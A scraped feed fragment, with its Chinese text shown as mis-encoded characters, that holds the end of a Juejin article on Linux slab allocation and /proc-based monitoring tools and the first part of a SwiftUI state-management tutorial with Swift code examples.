</ol>
<h3 data-id="heading-68">7.6 Slab åˆ†é…å™¨çš„å·¥ä½œåŸç†</h3>
<p><strong>Slab åˆ†é…å™¨çš„ç›®çš„</strong>ï¼š</p>
<ol>
<li><strong>å‡å°‘å†…å­˜ç¢ç‰‡</strong>ï¼šä¸ºç›¸åŒå¤§å°çš„å¯¹è±¡ä½¿ç”¨ä¸“é—¨çš„ç¼“å­˜</li>
<li><strong>æé«˜åˆ†é…é€Ÿåº¦</strong>ï¼šé¢„åˆ†é…å¯¹è±¡ï¼Œé¿å…é¢‘ç¹çš„é¡µé¢åˆ†é…</li>
<li><strong>ç¼“å­˜å‹å¥½</strong>ï¼šå¯¹è±¡åœ¨å†…å­˜ä¸­è¿ç»­ï¼Œæé«˜ç¼“å­˜å‘½ä¸­ç‡</li>
</ol>
<p><strong>Slab çš„ä¸‰çº§ç»“æ„</strong>ï¼š</p>
<ol>
<li>
<p><strong>æ¯ CPU ç¼“å­˜ï¼ˆarray_cacheï¼‰</strong>ï¼š</p>
<ul>
<li><strong>ä½œç”¨</strong>ï¼šå¿«é€Ÿåˆ†é…å’Œé‡Šæ”¾</li>
<li><strong>ç»“æ„</strong>ï¼šLIFO é˜Ÿåˆ—</li>
<li><strong>ä¼˜åŠ¿</strong>ï¼šæ— é”æ“ä½œï¼Œé€Ÿåº¦å¿«</li>
</ul>
</li>
<li>
<p><strong>èŠ‚ç‚¹ç¼“å­˜ï¼ˆkmem_cache_nodeï¼‰</strong>ï¼š</p>
<ul>
<li><strong>ä½œç”¨</strong>ï¼šç®¡ç† slab åˆ—è¡¨</li>
<li><strong>ç»“æ„</strong>ï¼šä¸‰ä¸ªåˆ—è¡¨ï¼ˆfullã€partialã€freeï¼‰</li>
<li><strong>ä¼˜åŠ¿</strong>ï¼šNUMA æ„ŸçŸ¥</li>
</ul>
</li>
<li>
<p><strong>Slab é¡µé¢</strong>ï¼š</p>
<ul>
<li><strong>ä½œç”¨</strong>ï¼šå®é™…å­˜å‚¨å¯¹è±¡</li>
<li><strong>ç»“æ„</strong>ï¼šä¸€ä¸ªæˆ–å¤šä¸ªè¿ç»­é¡µé¢</li>
<li><strong>ä¼˜åŠ¿</strong>ï¼šå¯¹è±¡è¿ç»­ï¼Œç¼“å­˜å‹å¥½</li>
</ul>
</li>
</ol>
<p><strong>åˆ†é…æµç¨‹</strong>ï¼š</p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-bullet">1.</span> å°è¯•ä»æ¯ CPU ç¼“å­˜åˆ†é…
   â†“ æˆåŠŸ
   è¿”å›å¯¹è±¡
   â†“ å¤±è´¥
<span class="hljs-bullet">2.</span> ä»èŠ‚ç‚¹ç¼“å­˜çš„ partial åˆ—è¡¨è·å–å¯¹è±¡
   â†“ æˆåŠŸ
   å¡«å……æ¯ CPU ç¼“å­˜ï¼Œè¿”å›å¯¹è±¡
   â†“ å¤±è´¥
<span class="hljs-bullet">3.</span> ä»èŠ‚ç‚¹ç¼“å­˜çš„ free åˆ—è¡¨è·å– slab
   â†“ æˆåŠŸ
   åˆå§‹åŒ– slabï¼Œè¿”å›å¯¹è±¡
   â†“ å¤±è´¥
<span class="hljs-bullet">4.</span> åˆ†é…æ–°é¡µé¢åˆ›å»º slab
   â†“
   åˆå§‹åŒ– slabï¼Œè¿”å›å¯¹è±¡
</code></pre>
<p><strong>é‡Šæ”¾æµç¨‹</strong>ï¼š</p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-bullet">1.</span> é‡Šæ”¾åˆ°æ¯ CPU ç¼“å­˜
   â†“ æœªæ»¡
   å®Œæˆ
   â†“ å·²æ»¡
<span class="hljs-bullet">2.</span> æ‰¹é‡é‡Šæ”¾åˆ°èŠ‚ç‚¹ç¼“å­˜
   â†“
   æ›´æ–°ç»Ÿè®¡
</code></pre>
<hr/>
<h2 data-id="heading-69">8. æ€»ç»“</h2>
<h3 data-id="heading-70">8.1 å·¥å…·å¯¹æ¯”</h3>









































<table><thead><tr><th>å·¥å…·</th><th>æ•°æ®æ¥æº</th><th>ä¸»è¦åŠŸèƒ½</th><th>æ›´æ–°æ–¹å¼</th></tr></thead><tbody><tr><td><strong>top</strong></td><td><code>/proc/stat</code>, <code>/proc/[pid]/stat</code></td><td>è¿›ç¨‹ç›‘æ§</td><td>å®šæœŸè¯»å–</td></tr><tr><td><strong>mpstat</strong></td><td><code>/proc/stat</code></td><td>CPU ç»Ÿè®¡</td><td>å®šæœŸè¯»å–</td></tr><tr><td><strong>htop</strong></td><td>åŒ top</td><td>è¿›ç¨‹ç›‘æ§ï¼ˆå¢å¼ºï¼‰</td><td>å®šæœŸè¯»å–</td></tr><tr><td><strong>free</strong></td><td><code>/proc/meminfo</code></td><td>å†…å­˜ç»Ÿè®¡</td><td>æ¯æ¬¡è¿è¡Œè¯»å–</td></tr><tr><td><strong>slabtop</strong></td><td><code>/proc/slabinfo</code></td><td>Slab ç»Ÿè®¡</td><td>å®šæœŸè¯»å–</td></tr></tbody></table>
<h3 data-id="heading-71">8.2 å†…æ ¸ç»Ÿè®¡çš„æ ¸å¿ƒæœºåˆ¶</h3>
<ol>
<li><strong>æ—¶é’Ÿä¸­æ–­</strong>ï¼šå®šæœŸæ›´æ–° CPU å’Œè´Ÿè½½ç»Ÿè®¡</li>
<li><strong>é¡µé¢åˆ†é…/é‡Šæ”¾</strong>ï¼šæ›´æ–°å†…å­˜ç»Ÿè®¡</li>
<li><strong>Slab åˆ†é…/é‡Šæ”¾</strong>ï¼šæ›´æ–° slab ç»Ÿè®¡</li>
<li><strong>è¿›ç¨‹åˆ‡æ¢</strong>ï¼šæ›´æ–°è¿›ç¨‹ç»Ÿè®¡</li>
</ol>
<h3 data-id="heading-72">8.3 å·¥å…·çš„å·¥ä½œåŸç†</h3>
<ol>
<li><strong>è¯»å–</strong>ï¼šä» <code>/proc</code> æ–‡ä»¶ç³»ç»Ÿè¯»å–æ•°æ®</li>
<li><strong>è®¡ç®—</strong>ï¼šè®¡ç®—å·®å€¼ã€ç™¾åˆ†æ¯”ç­‰</li>
<li><strong>æ˜¾ç¤º</strong>ï¼šæ ¼å¼åŒ–è¾“å‡º</li>
</ol>
<hr/></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[SwiftUI çŠ¶æ€ç®¡ç†è¯¦è§£]]></title>    <link>https://juejin.cn/post/7584028251167277083</link>    <guid>https://juejin.cn/post/7584028251167277083</guid>    <pubDate>2025-12-16T06:57:55.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7584028251167277083" data-draft-id="7584203412196622362" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="SwiftUI çŠ¶æ€ç®¡ç†è¯¦è§£"/> <meta itemprop="keywords" content="iOS"/> <meta itemprop="datePublished" content="2025-12-16T06:57:55.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å¦‚æ­¤é£æ™¯"/> <meta itemprop="url" content="https://juejin.cn/user/342703355996926"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            SwiftUI çŠ¶æ€ç®¡ç†è¯¦è§£
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/342703355996926/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å¦‚æ­¤é£æ™¯
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-16T06:57:55.000Z" title="Tue Dec 16 2025 06:57:55 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">SwiftUI çŠ¶æ€ç®¡ç†è¯¦è§£</h2>
<p>SwiftUI çš„çŠ¶æ€ç®¡ç†ç³»ç»Ÿæ˜¯å…¶æ ¸å¿ƒç‰¹æ€§ï¼Œç†è§£å®ƒæ˜¯æ„å»ºå¤æ‚åº”ç”¨çš„åŸºç¡€ã€‚ä»¥ä¸‹æ˜¯ SwiftUI çŠ¶æ€ç®¡ç†çš„å…¨é¢è¯¦è§£ï¼š</p>
<h3 data-id="heading-1">1. <strong>çŠ¶æ€ç®¡ç†çš„åŸºæœ¬æ¦‚å¿µ</strong></h3>
<h4 data-id="heading-2">ä»€ä¹ˆæ˜¯çŠ¶æ€ï¼Ÿ</h4>
<p>çŠ¶æ€æ˜¯éšæ—¶é—´å˜åŒ–çš„æ•°æ®ï¼Œè¿™äº›å˜åŒ–ä¼šè§¦å‘è§†å›¾çš„æ›´æ–°ã€‚</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-comment">// åŸºæœ¬çŠ¶æ€å£°æ˜</span>
<span class="hljs-meta">@State</span> <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> count <span class="hljs-operator">=</span> <span class="hljs-number">0</span>  <span class="hljs-comment">// ç®€å•å€¼</span>
<span class="hljs-meta">@State</span> <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> user <span class="hljs-operator">=</span> <span class="hljs-type">User</span>()  <span class="hljs-comment">// å¼•ç”¨ç±»å‹ï¼ˆä¸æ¨èï¼‰</span>
<span class="hljs-meta">@State</span> <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> items: [<span class="hljs-type">String</span>] <span class="hljs-operator">=</span> []  <span class="hljs-comment">// é›†åˆ</span>
</code></pre>
<h3 data-id="heading-3">2. <strong>@State</strong></h3>
<h4 data-id="heading-4">ç‰¹æ€§</h4>
<ul>
<li><strong>ç§æœ‰çŠ¶æ€</strong>ï¼šåªèƒ½åœ¨å½“å‰è§†å›¾å†…éƒ¨è®¿é—®</li>
<li><strong>å€¼ç±»å‹ä¸“ç”¨</strong>ï¼šæœ€é€‚åˆç®€å•å€¼ç±»å‹ï¼ˆIntã€Stringã€Boolç­‰ï¼‰</li>
<li><strong>è§†å›¾æ‹¥æœ‰</strong>ï¼šå½“è§†å›¾è¢«é”€æ¯æ—¶ï¼ŒçŠ¶æ€ä¹Ÿè¢«é”€æ¯</li>
<li><strong>è‡ªåŠ¨æ›´æ–°</strong>ï¼šçŠ¶æ€æ”¹å˜æ—¶ï¼Œè§†å›¾è‡ªåŠ¨é‡æ–°è®¡ç®—</li>
</ul>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">CounterView</span>: <span class="hljs-title class_">View</span> {
    <span class="hljs-meta">@State</span> <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> count <span class="hljs-operator">=</span> <span class="hljs-number">0</span>
    
    <span class="hljs-keyword">var</span> body: <span class="hljs-keyword">some</span> <span class="hljs-type">View</span> {
        <span class="hljs-type">VStack</span> {
            <span class="hljs-type">Text</span>(<span class="hljs-string">"Count: <span class="hljs-subst">\(count)</span>"</span>)
            <span class="hljs-type">Button</span>(<span class="hljs-string">"Increment"</span>) {
                count <span class="hljs-operator">+=</span> <span class="hljs-number">1</span>
            }
        }
    }
}
</code></pre>
<h4 data-id="heading-5">åº•å±‚åŸç†</h4>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-comment">// @State çš„ç®€åŒ–å®ç°æ¦‚å¿µ</span>
<span class="hljs-keyword">struct</span> <span class="hljs-title class_">State</span>&lt;<span class="hljs-title class_">Value</span>&gt; {
    <span class="hljs-keyword">var</span> wrappedValue: <span class="hljs-type">Value</span>
    <span class="hljs-keyword">var</span> projectedValue: <span class="hljs-type">Binding</span>&lt;<span class="hljs-type">Value</span>&gt;
    
    <span class="hljs-comment">// SwiftUI å†…éƒ¨ç®¡ç†ï¼š</span>
    <span class="hljs-comment">// 1. åœ¨è§†å›¾ä¹‹å¤–å­˜å‚¨å®é™…å€¼</span>
    <span class="hljs-comment">// 2. ç›‘å¬å˜åŒ–</span>
    <span class="hljs-comment">// 3. è§¦å‘è§†å›¾æ›´æ–°</span>
}
</code></pre>
<h3 data-id="heading-6">3. <strong>@Binding</strong></h3>
<h4 data-id="heading-7">ç‰¹æ€§</h4>
<ul>
<li><strong>åŒå‘è¿æ¥</strong>ï¼šåœ¨è§†å›¾ä¹‹é—´åˆ›å»ºåŒå‘æ•°æ®æµ</li>
<li><strong>ä¸æ‹¥æœ‰æ•°æ®</strong>ï¼šåªæ˜¯å¯¹ç°æœ‰çŠ¶æ€çš„å¼•ç”¨</li>
<li><strong>ä½¿ç”¨ $ å‰ç¼€</strong>ï¼šè·å–ç»‘å®š</li>
</ul>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-comment">// çˆ¶è§†å›¾</span>
<span class="hljs-keyword">struct</span> <span class="hljs-title class_">ParentView</span>: <span class="hljs-title class_">View</span> {
    <span class="hljs-meta">@State</span> <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> isOn <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>
    
    <span class="hljs-keyword">var</span> body: <span class="hljs-keyword">some</span> <span class="hljs-type">View</span> {
        <span class="hljs-type">ChildView</span>(isOn: <span class="hljs-variable">$isOn</span>)  <span class="hljs-comment">// ä¼ é€’ç»‘å®š</span>
    }
}

<span class="hljs-comment">// å­è§†å›¾</span>
<span class="hljs-keyword">struct</span> <span class="hljs-title class_">ChildView</span>: <span class="hljs-title class_">View</span> {
    <span class="hljs-meta">@Binding</span> <span class="hljs-keyword">var</span> isOn: <span class="hljs-type">Bool</span>
    
    <span class="hljs-keyword">var</span> body: <span class="hljs-keyword">some</span> <span class="hljs-type">View</span> {
        <span class="hljs-type">Toggle</span>(<span class="hljs-string">"Switch"</span>, isOn: <span class="hljs-variable">$isOn</span>)
    }
}
</code></pre>
<h3 data-id="heading-8">4. <strong>@StateObject vs @ObservedObject</strong></h3>
<h4 data-id="heading-9">å¯¹æ¯”</h4>






























<table><thead><tr><th>ç‰¹æ€§</th><th>@StateObject</th><th>@ObservedObject</th></tr></thead><tbody><tr><td><strong>ç”Ÿå‘½å‘¨æœŸ</strong></td><td>è§†å›¾æ‹¥æœ‰å¹¶ç®¡ç†</td><td>å¤–éƒ¨ç®¡ç†ï¼Œè§†å›¾åªè§‚å¯Ÿ</td></tr><tr><td><strong>åˆ›å»ºæ—¶æœº</strong></td><td>è§†å›¾åˆå§‹åŒ–æ—¶åˆ›å»º</td><td>å¤–éƒ¨ä¼ å…¥</td></tr><tr><td><strong>æ•°æ®ä¸¢å¤±</strong></td><td>è§†å›¾æ›´æ–°æ—¶ä¿ç•™</td><td>è§†å›¾æ›´æ–°æ—¶å¯èƒ½ä¸¢å¤±</td></tr><tr><td><strong>ä½¿ç”¨åœºæ™¯</strong></td><td>åˆ›å»ºå¹¶æ‹¥æœ‰ ViewModel</td><td>æ¥æ”¶çˆ¶è§†å›¾ä¼ é€’çš„ ViewModel</td></tr></tbody></table>
<h4 data-id="heading-10">@StateObject ç¤ºä¾‹</h4>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">class</span> <span class="hljs-title class_">UserViewModel</span>: <span class="hljs-title class_">ObservableObject</span> {
    <span class="hljs-meta">@Published</span> <span class="hljs-keyword">var</span> name <span class="hljs-operator">=</span> <span class="hljs-string">"John"</span>
    <span class="hljs-meta">@Published</span> <span class="hljs-keyword">var</span> age <span class="hljs-operator">=</span> <span class="hljs-number">30</span>
}

<span class="hljs-keyword">struct</span> <span class="hljs-title class_">UserView</span>: <span class="hljs-title class_">View</span> {
    <span class="hljs-meta">@StateObject</span> <span class="hljs-keyword">var</span> viewModel <span class="hljs-operator">=</span> <span class="hljs-type">UserViewModel</span>()  <span class="hljs-comment">// è§†å›¾åˆ›å»ºå¹¶æ‹¥æœ‰</span>
    
    <span class="hljs-keyword">var</span> body: <span class="hljs-keyword">some</span> <span class="hljs-type">View</span> {
        <span class="hljs-type">VStack</span> {
            <span class="hljs-type">Text</span>(<span class="hljs-string">"Name: <span class="hljs-subst">\(viewModel.name)</span>"</span>)
            <span class="hljs-type">Text</span>(<span class="hljs-string">"Age: <span class="hljs-subst">\(viewModel.age)</span>"</span>)
            <span class="hljs-type">Button</span>(<span class="hljs-string">"Increase Age"</span>) {
                viewModel.age <span class="hljs-operator">+=</span> <span class="hljs-number">1</span>
            }
        }
    }
}
</code></pre>
<h4 data-id="heading-11">@ObservedObject ç¤ºä¾‹</h4>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">ParentView</span>: <span class="hljs-title class_">View</span> {
    <span class="hljs-meta">@StateObject</span> <span class="hljs-keyword">var</span> sharedViewModel <span class="hljs-operator">=</span> <span class="hljs-type">SharedViewModel</span>()
    
    <span class="hljs-keyword">var</span> body: <span class="hljs-keyword">some</span> <span class="hljs-type">View</span> {
        <span class="hljs-type">VStack</span> {
            <span class="hljs-type">ChildView</span>(viewModel: sharedViewModel)  <span class="hljs-comment">// ä¼ é€’å¼•ç”¨</span>
        }
    }
}

<span class="hljs-keyword">struct</span> <span class="hljs-title class_">ChildView</span>: <span class="hljs-title class_">View</span> {
    <span class="hljs-meta">@ObservedObject</span> <span class="hljs-keyword">var</span> viewModel: <span class="hljs-type">SharedViewModel</span>  <span class="hljs-comment">// è§‚å¯Ÿå¤–éƒ¨å¯¹è±¡</span>
    
    <span class="hljs-keyword">var</span> body: <span class="hljs-keyword">some</span> <span class="hljs-type">View</span> {
        <span class="hljs-type">Text</span>(<span class="hljs-string">"Data: <span class="hljs-subst">\(viewModel.data)</span>"</span>)
    }
}
</code></pre>
<h3 data-id="heading-12">5. <strong>@EnvironmentObject</strong></h3>
<h4 data-id="heading-13">ç‰¹æ€§</h4>
<ul>
<li><strong>å…¨å±€å…±äº«</strong>ï¼šåœ¨è§†å›¾å±‚æ¬¡ä¸­éšå¼å…±äº«</li>
<li><strong>é¿å…ä¼ é€’é“¾</strong>ï¼šä¸éœ€è¦é€å±‚ä¼ é€’</li>
<li><strong>å¿…é¡»æä¾›</strong>ï¼šä½¿ç”¨å‰å¿…é¡»é€šè¿‡ <code>.environmentObject()</code> æä¾›</li>
</ul>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-comment">// 1. åˆ›å»º ObservableObject</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">AppSettings</span>: <span class="hljs-title class_">ObservableObject</span> {
    <span class="hljs-meta">@Published</span> <span class="hljs-keyword">var</span> theme <span class="hljs-operator">=</span> <span class="hljs-string">"Light"</span>
    <span class="hljs-meta">@Published</span> <span class="hljs-keyword">var</span> fontSize <span class="hljs-operator">=</span> <span class="hljs-number">16.0</span>
}

<span class="hljs-comment">// 2. åœ¨æ ¹è§†å›¾æä¾›</span>
<span class="hljs-keyword">@main</span>
<span class="hljs-keyword">struct</span> <span class="hljs-title class_">MyApp</span>: <span class="hljs-title class_">App</span> {
    <span class="hljs-meta">@StateObject</span> <span class="hljs-keyword">var</span> settings <span class="hljs-operator">=</span> <span class="hljs-type">AppSettings</span>()
    
    <span class="hljs-keyword">var</span> body: <span class="hljs-keyword">some</span> <span class="hljs-type">Scene</span> {
        <span class="hljs-type">WindowGroup</span> {
            <span class="hljs-type">ContentView</span>()
                .environmentObject(settings)  <span class="hljs-comment">// æ³¨å…¥ç¯å¢ƒ</span>
        }
    }
}

<span class="hljs-comment">// 3. åœ¨ä»»ä½•å­è§†å›¾ä¸­è®¿é—®</span>
<span class="hljs-keyword">struct</span> <span class="hljs-title class_">ContentView</span>: <span class="hljs-title class_">View</span> {
    <span class="hljs-meta">@EnvironmentObject</span> <span class="hljs-keyword">var</span> settings: <span class="hljs-type">AppSettings</span>
    
    <span class="hljs-keyword">var</span> body: <span class="hljs-keyword">some</span> <span class="hljs-type">View</span> {
        <span class="hljs-type">VStack</span> {
            <span class="hljs-type">Text</span>(<span class="hljs-string">"Theme: <span class="hljs-subst">\(settings.theme)</span>"</span>)
            <span class="hljs-type">Button</span>(<span class="hljs-string">"Toggle Theme"</span>) {
                settings.theme <span class="hljs-operator">=</span> settings.theme <span class="hljs-operator">==</span> <span class="hljs-string">"Light"</span> <span class="hljs-operator">?</span> <span class="hljs-string">"Dark"</span> : <span class="hljs-string">"Light"</span>
            }
        }
    }
}
</code></pre>
<h3 data-id="heading-14">6. <strong>@Environment</strong></h3>
<h4 data-id="heading-15">ç‰¹æ€§</h4>
<ul>
<li><strong>ç³»ç»Ÿå€¼</strong>ï¼šè®¿é—®ç³»ç»Ÿæä¾›çš„ç¯å¢ƒå€¼</li>
<li><strong>è‡ªå®šä¹‰ç¯å¢ƒ</strong>ï¼šä¹Ÿå¯ä»¥å®šä¹‰è‡ªå·±çš„ç¯å¢ƒå€¼</li>
<li><strong>åªè¯»</strong>ï¼šé€šå¸¸æ˜¯åªè¯»çš„ï¼ˆé™¤éä½¿ç”¨ Bindingï¼‰</li>
</ul>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-comment">// ä½¿ç”¨ç³»ç»Ÿç¯å¢ƒå€¼</span>
<span class="hljs-keyword">struct</span> <span class="hljs-title class_">SystemInfoView</span>: <span class="hljs-title class_">View</span> {
    <span class="hljs-meta">@Environment</span>(\.colorScheme) <span class="hljs-keyword">var</span> colorScheme
    <span class="hljs-meta">@Environment</span>(\.sizeCategory) <span class="hljs-keyword">var</span> sizeCategory
    <span class="hljs-meta">@Environment</span>(\.locale) <span class="hljs-keyword">var</span> locale
    
    <span class="hljs-keyword">var</span> body: <span class="hljs-keyword">some</span> <span class="hljs-type">View</span> {
        <span class="hljs-type">VStack</span> {
            <span class="hljs-type">Text</span>(<span class="hljs-string">"Color Scheme: <span class="hljs-subst">\(colorScheme <span class="hljs-operator">==</span> .dark <span class="hljs-operator">?</span> <span class="hljs-string">"Dark"</span> : <span class="hljs-string">"Light"</span>)</span>"</span>)
            <span class="hljs-type">Text</span>(<span class="hljs-string">"Locale: <span class="hljs-subst">\(locale.identifier)</span>"</span>)
        }
    }
}

<span class="hljs-comment">// è‡ªå®šä¹‰ç¯å¢ƒå€¼</span>
<span class="hljs-comment">// 1. å®šä¹‰ç¯å¢ƒé”®</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">UserThemeKey</span>: <span class="hljs-title class_">EnvironmentKey</span> {
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">let</span> defaultValue <span class="hljs-operator">=</span> <span class="hljs-string">"Light"</span>
}

<span class="hljs-keyword">extension</span> <span class="hljs-title class_">EnvironmentValues</span> {
    <span class="hljs-keyword">var</span> userTheme: <span class="hljs-type">String</span> {
        <span class="hljs-keyword">get</span> { <span class="hljs-keyword">self</span>[<span class="hljs-type">UserThemeKey</span>.<span class="hljs-keyword">self</span>] }
        <span class="hljs-keyword">set</span> { <span class="hljs-keyword">self</span>[<span class="hljs-type">UserThemeKey</span>.<span class="hljs-keyword">self</span>] <span class="hljs-operator">=</span> newValue }
    }
}

<span class="hljs-comment">// 2. ä½¿ç”¨è‡ªå®šä¹‰ç¯å¢ƒ</span>
<span class="hljs-keyword">struct</span> <span class="hljs-title class_">ThemedView</span>: <span class="hljs-title class_">View</span> {
    <span class="hljs-meta">@Environment</span>(\.userTheme) <span class="hljs-keyword">var</span> theme
    
    <span class="hljs-keyword">var</span> body: <span class="hljs-keyword">some</span> <span class="hljs-type">View</span> {
        <span class="hljs-type">Text</span>(<span class="hljs-string">"Current theme: <span class="hljs-subst">\(theme)</span>"</span>)
    }
}

<span class="hljs-comment">// 3. è®¾ç½®è‡ªå®šä¹‰ç¯å¢ƒ</span>
<span class="hljs-type">ParentView</span>()
    .environment(\.userTheme, <span class="hljs-string">"Dark"</span>)
</code></pre>
<h3 data-id="heading-16">7. <strong>@Published ä¸ ObservableObject</strong></h3>
<h4 data-id="heading-17">å·¥ä½œæœºåˆ¶</h4>
